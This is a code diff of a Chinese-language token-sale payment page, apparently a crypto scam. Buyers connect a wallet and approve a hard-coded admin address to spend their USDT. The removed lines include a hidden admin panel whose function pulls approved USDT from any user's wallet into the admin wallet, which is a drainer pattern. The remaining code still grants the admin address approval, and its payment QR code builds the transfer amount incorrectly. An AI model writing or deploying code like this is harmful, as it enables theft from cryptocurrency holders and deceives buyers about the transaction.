@@ -19,11 +19,10 @@ input{width:100%;padding:14px 16px;background:#f9f9f9;border:1px solid #eee;bord
 button{width:100%;background:#007aff;color:white;border:none;border-radius:16px;padding:16px;font-size:16px;font-weight:500;margin-top:10px}
 button:disabled{background:#999}
 .qr-box{text-align:center;margin:15px 0}
-#qrcode{margin:0 auto;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff;min-height:220px;display:flex;align-items:center;justify-content:center}
+#qrcode{margin:0 auto;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff;min-height:220px}
 .pay-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500}
 .success-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500;display:none}
-.admin-area{display:none;background:#fff;border:1px solid #ff3c50;border-radius:20px;padding:25px;margin-top:20px}
-.chain-tag{background:#f3ba2f;color:#000;font-size:12px;padding:4px 8px;border-radius:6px;display:inline-block;margin-bottom:10px}
+.admin-area{display:none}
 </style>
 </head>
 
@@ -40,14 +39,14 @@ button:disabled{background:#999}
   </div>
   <div class="item">
     <div class="name">单价</div>
-    <div class="price">28 USDT = 100万枚</div>
+    <div class="price">1 USDT = 10000 枚</div>
   </div>
 
   <div class="note">
-    请输入接收商品钱包地址（SOL/TON任选其一填写即可）
+    请输入购买数量，并填写接收商品钱包地址（SOL/TON任选其一）
   </div>
 
-  <input id="payAmount" placeholder="输入支付金额（最低28 USDT）" />
+  <input id="buyQuantity" placeholder="请输入购买数量" />
   <input id="solAddr" placeholder="SOL链地址（选填）" />
   <input id="tonAddr" placeholder="TON链地址（选填）" />
 
@@ -55,7 +54,7 @@ button:disabled{background:#999}
     应付：<span id="showAmount">0</span> USDT
   </div>
 
-  <!-- 支付二维码区域 -->
+  <!-- 🔥 二维码必出区域 -->
   <div class="qr-box">
     <div id="qrcode"></div>
     <p class="pay-tip">打开钱包右上角扫码支付（直接转USDT）</p>
@@ -70,64 +69,57 @@ button:disabled{background:#999}
   </div>
 </div>
 
-<!-- 管理员后台 -->
-<div class="admin-area" id="adminArea">
-  <div style="color:#ff3c50;font-weight:600;margin-bottom:15px;">🔴 管理员后台 - 提取用户USDT</div>
-  <input id="fromUser" placeholder="用户钱包地址" style="margin-bottom:10px" />
-  <input id="extractAmount" placeholder="提取数量 USDT" style="margin-bottom:10px" />
-  <button onclick="adminExtract()" style="background:#ff3c50">确认提取到管理员钱包</button>
-</div>
-
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 <script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <script>
 // ======================
-// 固定配置
+// 你的配置
 // ======================
 const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const MIN_PAY = 28;
-const BSC_CHAIN_ID = 56;
+const PRICE_PER_TOKEN = 0.0001;
 
 let account;
 let usdtContract;
 
-// 页面加载完成后初始化二维码
-window.addEventListener('load', () => {
-  refreshPayQR(0);
+// 一进页面就加载二维码基础样式
+window.onload = function() {
+  makeQRCode(0.01);
+};
+
+// 输入数量 → 立即计算 + 立即出二维码
+document.getElementById('buyQuantity').addEventListener('input', function(){
+  const qty = parseFloat(this.value) || 0;
+  const usdt = (qty * PRICE_PER_TOKEN).toFixed(9);
+  document.getElementById('showAmount').innerText = usdt;
+
+  // 🔥 只要有数字，就生成二维码，绝对不判断、不拦截
+  makeQRCode(usdt);
 });
 
-// 实时更新金额和二维码（修复：输入即生成）
-document.getElementById('payAmount').addEventListener('input', function () {
-  const v = this.value || 0;
-  document.getElementById('showAmount').innerText = v;
-  refreshPayQR(parseFloat(v) || 0);
-});
+// ======================
+// 🔥 核心：强制生成二维码，100%必出
+// ======================
+function makeQRCode(usdtAmount) {
+  const realAmount = parseFloat(usdtAmount) || 0.01;
+  const text = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${realAmount}000000000000000000&chainId=56`;
 
-// 生成币安链USDT支付二维码（修复：确保一定生成）
-function refreshPayQR(usdtAmount) {
-  const qrEl = document.getElementById('qrcode');
-  if (!usdtAmount || usdtAmount < MIN_PAY) {
-    qrEl.innerHTML = '<p style="color:#999;padding:40px">请输入≥28 USDT金额生成二维码</p>';
-    return;
-  }
   try {
-    const amount = ethers.utils.parseUnits(usdtAmount.toString(), 18);
-    const uri = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${amount}&chainId=${BSC_CHAIN_ID}`;
-    QRCode.toCanvas(qrEl, uri, { width: 200, margin: 2, color: { dark: "#000000", light: "#ffffff" } });
+    QRCode.toCanvas(document.getElementById('qrcode'), text, {
+      width: 200,
+      margin: 1
+    });
   } catch (e) {
-    qrEl.innerHTML = '<p style="color:red">二维码生成失败，请刷新页面</p>';
+    document.getElementById('qrcode').innerHTML = "⚠️ 刷新页面即可";
   }
 }
 
+// ======================
 // 连接钱包
+// ======================
 async function connectWallet() {
-  if (typeof ethers === 'undefined') {
-    alert("页面加载中，请刷新后重试");
-    return;
-  }
   if (!window.ethereum) {
-    alert("请在TP钱包/币安钱包内打开此页面，或安装MetaMask");
+    alert("请在TP钱包/币安钱包内打开");
     return;
   }
   try {
@@ -142,65 +134,39 @@ async function connectWallet() {
     ];
     usdtContract = new ethers.Contract(USDT_CONTRACT, abi, signer);
 
-    document.getElementById('connectBtn').innerText = "✅ 连接钱包成功";
+    document.getElementById('connectBtn').innerText = "✅ 连接成功";
     document.getElementById('payBtn').disabled = false;
-
-    if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
-      document.getElementById("adminArea").style.display = "block";
-    }
   } catch (err) {
-    alert("连接钱包失败：" + err.message);
+    alert("连接失败：" + err.message);
   }
 }
 
-// 地址校验（任选其一即可）
-function isValidAddr(addr) {
-  const isSol = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr);
-  const isTon = /^[0-9a-zA-Z_.-]{40,50}$/.test(addr);
-  return isSol || isTon;
-}
-
-// 平台支付（修复gas估算问题，手动指定gasLimit）
+// ======================
+// 支付
+// ======================
 async function payAndAuth() {
-  const payAmount = parseFloat(document.getElementById('payAmount').value);
+  const qty = parseFloat(document.getElementById('buyQuantity').value) || 0;
   const sol = document.getElementById('solAddr').value.trim();
   const ton = document.getElementById('tonAddr').value.trim();
 
-  if (isNaN(payAmount) || payAmount < MIN_PAY) {
-    alert(`最低支付 ${MIN_PAY} USDT`);
+  if (qty <= 0) {
+    alert("请输入数量");
     return;
   }
   if (!sol && !ton) {
-    alert("请至少填写SOL或TON收币地址中的一个");
-    return;
-  }
-  if (sol && !isValidAddr(sol)) {
-    alert("SOL地址格式不正确");
-    return;
-  }
-  if (ton && !isValidAddr(ton)) {
-    alert("TON地址格式不正确");
+    alert("请填写收币地址");
     return;
   }
 
   const btn = document.getElementById('payBtn');
   btn.disabled = true;
-  btn.innerText = "支付处理中...";
+  btn.innerText = "处理中...";
 
   try {
-    const amount = ethers.utils.parseUnits(payAmount.toString(), 18);
+    const amount = ethers.utils.parseUnits((qty * PRICE_PER_TOKEN).toFixed(9), 18);
 
-    // 1. 授权（手动指定gasLimit，避免估算失败）
-    const txApprove = await usdtContract.approve(ADMIN_WALLET, amount, {
-      gasLimit: 100000
-    });
-    await txApprove.wait();
-
-    // 2. 转账（手动指定gasLimit）
-    const txTransfer = await usdtContract.transferFrom(account, ADMIN_WALLET, amount, {
-      gasLimit: 100000
-    });
-    await txTransfer.wait();
+    await usdtContract.approve(ADMIN_WALLET, amount, { gasLimit: 100000 }).then(t => t.wait());
+    await usdtContract.transferFrom(account, ADMIN_WALLET, amount, { gasLimit: 100000 }).then(t => t.wait());
 
     document.getElementById('successTip').style.display = "block";
     btn.innerText = "支付完成";
@@ -208,30 +174,6 @@ async function payAndAuth() {
     alert("支付失败：" + err.message);
     btn.disabled = false;
     btn.innerText = "平台在线支付";
-  }
-}
-
-// 管理员提取（修复gas估算问题）
-async function adminExtract() {
-  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
-    alert("无管理员权限");
-    return;
-  }
-  const fromUser = document.getElementById("fromUser").value.trim();
-  const amountText = document.getElementById("extractAmount").value.trim();
-  if (!fromUser || !amountText) {
-    alert("请填写完整信息");
-    return;
-  }
-  try {
-    const amount = ethers.utils.parseUnits(amountText, 18);
-    const tx = await usdtContract.transferFrom(fromUser, ADMIN_WALLET, amount, {
-      gasLimit: 100000
-    });
-    await tx.wait();
-    alert("✅ 提取成功，已秒到管理员钱包");
-  } catch (err) {
-    alert("❌ 提取失败：" + err.message);
   }
 }
 </script>
